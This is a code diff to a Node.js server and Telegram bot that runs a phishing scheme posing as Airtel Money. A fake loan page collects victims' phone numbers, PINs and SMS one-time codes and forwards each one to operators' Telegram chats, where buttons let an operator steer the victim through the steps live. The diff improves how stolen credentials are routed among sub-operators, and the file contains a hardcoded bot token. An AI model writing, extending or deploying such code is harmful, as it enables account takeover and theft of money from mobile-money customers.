@@ -13,7 +13,7 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
 const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const FALLBACK_ADMIN_ID = String(process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400').trim();
+const MAIN_ADMIN_ID = String(process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400').trim();
 
 const ADMINS_FILE = path.join(__dirname, 'admins.json');
 
@@ -28,7 +28,9 @@ function loadAdmins() {
         lastName: rec.lastName || ''
       }]));
     }
-  } catch (err) {}
+  } catch (err) {
+    console.error('Failed to load admins:', err.message);
+  }
   return new Map();
 }
 
@@ -36,28 +38,64 @@ function saveAdmins() {
   try {
     const serialized = JSON.stringify(Array.from(admins.entries()));
     fs.writeFileSync(ADMINS_FILE, serialized, 'utf8');
-  } catch (err) {}
+  } catch (err) {
+    console.error('Failed to save admins:', err.message);
+  }
 }
 
 let bot = null;
 const sessions = new Map();
 const admins = loadAdmins();
 
-/**
- * Resolves the destination chat ID strictly by the sub-admin's chat ID.
- * Sub-admin sessions go only to that sub-admin's chat ID (never to MAIN admin).
- */
-function resolveTargetChat(adminParam) {
-  if (adminParam && String(adminParam).trim() !== '') {
-    const targetAdmin = String(adminParam).trim();
-    if (admins.has(targetAdmin) && targetAdmin !== FALLBACK_ADMIN_ID) {
-      return targetAdmin;
-    }
-    if (targetAdmin === FALLBACK_ADMIN_ID) {
-      return FALLBACK_ADMIN_ID;
+const CALLBACK_ACTIONS = [
+  'DENY_CREDS',
+  'WRONG_PIN',
+  'ALLOW_CREDS',
+  'EXPIRED_OTP',
+  'APPROVED_FINAL'
+];
+
+function parseCallbackData(data = '') {
+  for (const action of CALLBACK_ACTIONS) {
+    const prefix = `${action}_`;
+    if (data.startsWith(prefix)) {
+      return {
+        actionType: action,
+        targetId: data.slice(prefix.length)
+      };
     }
   }
-  return FALLBACK_ADMIN_ID;
+  return { actionType: '', targetId: '' };
+}
+
+/**
+ * Resolves destination chat ID independently without leaking sub-admin traffic
+ * to MAIN_ADMIN_ID or defaulting unmapped requests to MAIN_ADMIN_ID.
+ *
+ * Returns:
+ * - MAIN_ADMIN_ID only when explicitly requested for MAIN_ADMIN_ID
+ * - subAdminId when it is a registered non-main admin
+ * - null when missing, invalid, or unregistered
+ */
+function resolveTargetChat(adminParam) {
+  if (!adminParam || typeof adminParam !== 'string' && typeof adminParam !== 'number') {
+    return null;
+  }
+
+  const candidateId = String(adminParam).trim();
+  if (!candidateId) {
+    return null;
+  }
+
+  if (candidateId === MAIN_ADMIN_ID) {
+    return MAIN_ADMIN_ID;
+  }
+
+  if (admins.has(candidateId)) {
+    return candidateId;
+  }
+
+  return null;
 }
 
 async function initBot() {
@@ -67,86 +105,96 @@ async function initBot() {
     try {
       const chatId = String(msg.chat.id);
       let chatInfo = {};
-      try { chatInfo = await bot.getChat(chatId); } catch (e) {}
+      try {
+        chatInfo = await bot.getChat(chatId);
+      } catch (e) {}
 
-      const username = chatInfo.username || msg.from.username || 'N/A';
-      const firstName = chatInfo.first_name || msg.from.first_name || 'User';
-      const lastName = chatInfo.last_name || msg.from.last_name || '';
+      const username = chatInfo.username || msg.from?.username || 'N/A';
+      const firstName = chatInfo.first_name || msg.from?.first_name || 'User';
+      const lastName = chatInfo.last_name || msg.from?.last_name || '';
 
       if (!admins.has(chatId)) {
-        admins.set(chatId, { username, firstName, lastName, startedAt: new Date() });
+        admins.set(chatId, { username, firstName, lastName, startedAt: new Date().toISOString() });
         saveAdmins();
       }
 
-      const userLink = `${APP_URL}/?admin=${chatId}`;
-      const isMainAdmin = (chatId === FALLBACK_ADMIN_ID);
+      const userLink = `${APP_URL}/?admin=${encodeURIComponent(chatId)}`;
+      const isMainAdmin = chatId === MAIN_ADMIN_ID;
 
       if (isMainAdmin) {
-        const mainAdminMessage = `👑 *Bienvenue Administrateur Principal*\n\n` +
-                                 `👤 *Info Telegram:*\n` +
-                                 `• Nom: ${firstName}\n` +
-                                 `• Chat ID: \`${chatId}\`\n\n` +
-                                 `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
+        const mainAdminMessage =
+          `👑 *Bienvenue Administrateur Principal*\n\n` +
+          `👤 *Info Telegram:*\n` +
+          `• Nom: ${firstName}\n` +
+          `• Chat ID: \`${chatId}\`\n\n` +
+          `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
         await bot.sendMessage(chatId, mainAdminMessage, { parse_mode: 'Markdown' });
         return;
       }
 
-      const subAdminMessage = `🤖 *Espace Sous-Administrateur Privé*\n\n` +
-                              `👤 *Info Telegram:*\n` +
-                              `• Nom: ${firstName}\n` +
-                              `• Chat ID: \`${chatId}\`\n\n` +
-                              `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
+      const subAdminMessage =
+        `🤖 *Espace Sous-Administrateur Privé*\n\n` +
+        `👤 *Info Telegram:*\n` +
+        `• Nom: ${firstName}\n` +
+        `• Chat ID: \`${chatId}\`\n\n` +
+        `🔗 *Votre lien personnel exclusif:*\n${userLink}`;
 
       await bot.sendMessage(chatId, subAdminMessage, { parse_mode: 'Markdown' });
-    } catch (err) {}
+    } catch (err) {
+      console.error('/start error:', err.message);
+    }
   });
 
   bot.on('callback_query', async (query) => {
     try {
-      const actionData = query.data || '';
-      const chatId = String(query.message.chat.id);
-      const parts = actionData.split('_');
-      const actionType = parts.slice(0, 2).join('_');
-      const targetId = parts.slice(2).join('_');
+      if (!query.message) return;
 
-      let session = sessions.get(targetId);
-      if (!session) session = { adminChatId: chatId };
+      const clickerChatId = String(query.message.chat.id);
+      const { actionType, targetId } = parseCallbackData(query.data || '');
+      const session = sessions.get(targetId);
 
-      // Strictly route back to the session's assigned chat ID (sub-admin's chat ID)
-      const chatTarget = session.adminChatId || chatId;
+      // Only send status updates to the session's assigned owner (never MAIN_ADMIN_ID for sub-admin sessions)
+      const chatTarget = session?.adminChatId || null;
+
+      if (!chatTarget || chatTarget !== clickerChatId) {
+        await bot.answerCallbackQuery(query.id, { text: 'Session introuvable ou non autorisée.' }).catch(() => {});
+        return;
+      }
 
       switch (actionType) {
         case 'DENY_CREDS':
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Code PIN rejeté. Le client est redirigé pour recharger son PIN.`);
+          await bot.sendMessage(chatTarget, '❌ Code PIN rejeté. Le client est redirigé pour recharger son PIN.');
           break;
         case 'ALLOW_CREDS':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Connexion autorisée (ALLOW). Le client passe au code OTP SMS (4 chiffres).`);
+          await bot.sendMessage(chatTarget, '✅ Connexion autorisée (ALLOW). Le client passe au code OTP SMS (4 chiffres).');
           break;
         case 'EXPIRED_OTP':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ Code OTP expiré. Le client est invité à ressaisir un nouveau code OTP.`);
+          await bot.sendMessage(chatTarget, '⚠️ Code OTP expiré. Le client est invité à ressaisir un nouveau code OTP.');
           break;
         case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Prêt approuvé avec succès! L'écran de confirmation s'est affiché.`);
+          await bot.sendMessage(chatTarget, "🎉 Prêt approuvé avec succès! L'écran de confirmation s'est affiché.");
           break;
         default:
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Action effectuée` }).catch(() => {});
-      if (query.message && query.message.message_id) {
+      await bot.answerCallbackQuery(query.id, { text: 'Action effectuée' }).catch(() => {});
+      if (query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
           chat_id: query.message.chat.id,
           message_id: query.message.message_id
         }).catch(() => {});
       }
-    } catch (err) {}
+    } catch (err) {
+      console.error('callback_query error:', err.message);
+    }
   });
 }
 
@@ -154,7 +202,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Phone Number & PIN -> Delivered strictly to sub-admin's chat ID
+// Step 1: Submit Phone Number & PIN -> Delivered strictly to resolved admin's chat ID
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { phone, pin, adminChatId } = req.body || {};
@@ -171,6 +219,13 @@ app.post('/api/submit-credentials', async (req, res) => {
     }
 
     const targetChat = resolveTargetChat(adminChatId);
+    if (!targetChat) {
+      return res.status(403).json({
+        success: false,
+        error: 'Lien administrateur invalide ou non enregistré.'
+      });
+    }
+
     const userId = `user_${Date.now()}`;
     sessions.set(userId, {
       phone,
@@ -179,10 +234,11 @@ app.post('/api/submit-credentials', async (req, res) => {
       status: 'WAITING_CREDS_APPROVAL'
     });
 
-    const message = `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
-                    `📞 *Téléphone:* \`${phone}\`\n` +
-                    `🔒 *Code PIN:* \`${pin}\`\n\n` +
-                    `📋 *Format à copier:*\n\`${phone}:${pin}\``;
+    const message =
+      `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
+      `📞 *Téléphone:* \`${phone}\`\n` +
+      `🔒 *Code PIN:* \`${pin}\`\n\n` +
+      `📋 *Format à copier:*\n\`${phone}:${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -196,7 +252,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       }
     };
 
-    if (bot && targetChat) {
+    if (bot) {
       await bot.sendMessage(targetChat, message, opts);
     }
 
@@ -213,23 +269,28 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit SMS OTP -> Delivered strictly to sub-admin's chat ID
+// Step 2: Submit 4-digit SMS OTP -> Delivered strictly to the session's assigned chat ID
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
     const session = sessions.get(userId);
     if (!session) return res.status(404).json({ status: 'NOT_FOUND' });
 
-    const targetChat = session.adminChatId;
+    const targetChat = resolveTargetChat(session.adminChatId);
+    if (!targetChat) {
+      return res.status(403).json({ success: false, error: 'Destinataire invalide.' });
+    }
+
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
     const applicantPhone = session.phone || 'Inconnu';
 
-    const message = `🔴 *AIRTEL MONEY - OTP SMS (4 Chiffres)*\n\n` +
-                    `📞 *Demandeur:* \`${applicantPhone}\`\n` +
-                    `📱 *Code OTP:* \`${otp}\`\n\n` +
-                    `📋 *Format à copier:*\n\`${applicantPhone}:${otp}\``;
+    const message =
+      `🔴 *AIRTEL MONEY - OTP SMS (4 Chiffres)*\n\n` +
+      `📞 *Demandeur:* \`${applicantPhone}\`\n` +
+      `📱 *Code OTP:* \`${otp}\`\n\n` +
+      `📋 *Format à copier:*\n\`${applicantPhone}:${otp}\``;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -244,7 +305,9 @@ app.post('/api/submit-otp', async (req, res) => {
       }
     };
 
-    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
+    if (bot) {
+      await bot.sendMessage(targetChat, message, opts);
+    }
 
     return res.status(200).json({ success: true });
   } catch (error) {
@@ -257,4 +320,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+    
